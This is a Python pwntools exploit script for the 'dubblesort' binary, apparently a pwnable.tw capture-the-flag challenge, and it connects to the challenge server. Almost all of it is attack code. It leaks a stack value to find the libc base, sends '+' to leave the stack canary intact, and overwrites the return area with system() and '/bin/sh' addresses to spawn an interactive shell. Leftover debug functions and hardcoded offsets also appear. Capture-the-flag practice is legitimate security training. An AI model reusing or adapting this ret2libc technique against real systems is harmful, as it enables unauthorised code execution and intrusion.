from pwn import *


#libc = ELF('/lib32/libc-2.27.so')
libc = ELF('./libc-2.27.so')
#libc = ELF('./libc_32.so.6')
elf = ELF('./dubblesort')

context(terminal=['tmux', 'new-window'])

#context(os = 'linux', arch = 'x86_64')
context.log_level = 'DEBUG'
#context.aslr = 'False'

#context.arch = 'i386'

value = "alksjdalkdj"

if len(sys.argv) > 2 and sys.argv[1] == '-input':
    value = sys.argv[2]

if len(sys.argv) > 3 and sys.argv[3] == 'debug':
        break_point = sys.argv[4]
        p = gdb.debug('./dubblesort', 
     '''
        b *%s
        commands
            silent
        end
      ''' % break_point)

elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = gdb.debug('./dubblesort')
else:
    #p = process('./dubblesort')
    p = remote('chall.pwnable.tw', 10101)



def stackattack_debug():
    p.recvuntil(":")
    p.sendline("40")

    for x in range(24):
        p.recvuntil(":")
        p.sendline(str(x))
    p.recvuntil(":")
    p.sendline('+')
    for x in range(24, 31):
        p.recvuntil(":")
        p.sendline(str(base + system))
    p.recvuntil(":")
    p.sendline(str(base + system))
    p.recvuntil(":")
    p.sendline(str(base + bin_shell))
    p.recvuntil(":")
    p.sendline(str(base + bin_shell))
    p.recvuntil(":")
    p.sendline(str(base + bin_shell))
    p.recvuntil(":")
    p.sendline(str(base + bin_shell))
    p.recvuntil(":")
    p.sendline(str(base + bin_shell))
    p.recvuntil(":")
    p.sendline(str(base + bin_shell))
    p.recvuntil(":")
    p.sendline(str(base + bin_shell))
    p.recvuntil(":")
    p.sendline(str(base + bin_shell))
    #p.recvuntil(":")
    #p.sendline(str(base + bin_shell))
    p.interactive()
    #p.recvline()
    #p.recvline()
    #blah = p.recvuntil("4294956988 ")
    #print('blah :: ' + blah)
    #p.wait_for_close()

def stackattack(canary):
    p.recvuntil(":")
    p.sendline("54")
    
    p.recvuntil(":")
    #p.sendline(canary  + '\x00')
    #p.sendline(str(u32('\x00' + canary)))
    p.sendline(p32(u32('\x00' + canary)))
    print('canary :: ' + str(u32('\x00' + canary)))

    for x in range(12):
        p.recvuntil(":")
        print('send :: ' + str(u32('\x00' + canary) + x))
	p.sendline(p32(u32('\x00' + canary) + x))
        #p.sendline(str(x))

    p.recvuntil(":")
    p.sendline(str(canary))
    
    for x in range(12, 54):
        p.recvuntil(":")
	#p.sendline(str(u32(canary + '\x00') + x))
	p.sendline("1")
    #p.sendline("asdadasdas")
    #for x in range(5):
    #    p.recvuntil(":")
    #	p.sendline(str(u32(canary + '\x00') + x))
    p.recvline()
    p.recvline()
    blah = p.recvuntil("4294956988 ")
    #blah = p.recvuntil("*** stack smashing detected ***")
    #blah = p.recvuntil("3")
    print('blah :: ' + blah)
    p.wait_for_close()

def stackprint():
    p.recvuntil(":")
    p.sendline("50")

    p.recvuntil(":")
    #p.sendline("lakjd")
    p.sendline("llkasjdlajdalksjdalksdjlkajsdllkasjdlaksakjdakldjalajdslasjdlkasdajsdajsldjkdlkjadlkjalkdjasldjasldjalsdjalsdkj")


    blah = p.recvline()
    print(blah)
    p.recvline() 
    blah = p.recv(1000) 
    #blah = p.recvuntil("*** stack smashing detected ***")
    output_array = blah.split(" ")
    for i in range(len(output_array)):
            print(str(i) + " " + output_array[i])
    #blah = p.recvline()


def stackleak(value):
    p.recvuntil(":")
    p.sendline(value)
    p.sendline()

    p.recvuntil(value + "\n")
    print(str(hex(u32('\x00' +  p.recv(3)))))
    stack_leak = u32(p.recv(4))
    stack_leak_2 = u32(p.recv(4))
    print(str(hex(stack_leak)))
    print(str(hex(stack_leak_2)))
    return stack_leak
    #print(str(hex(u32(p.recv(4)))))
    #p.recvuntil("\n")

libc_leak = stackleak(value)
#1761860
#base = libc_leak-196681
base = libc_leak-1761860
print('base :: ' + hex(base))

bin_shell = libc.search('/bin/sh').next()
system = libc.symbols['system']

print('bin_shell :: ' + str(hex(base + bin_shell)))
print('system :: ' + str(hex(base + system)))


stackattack_debug()
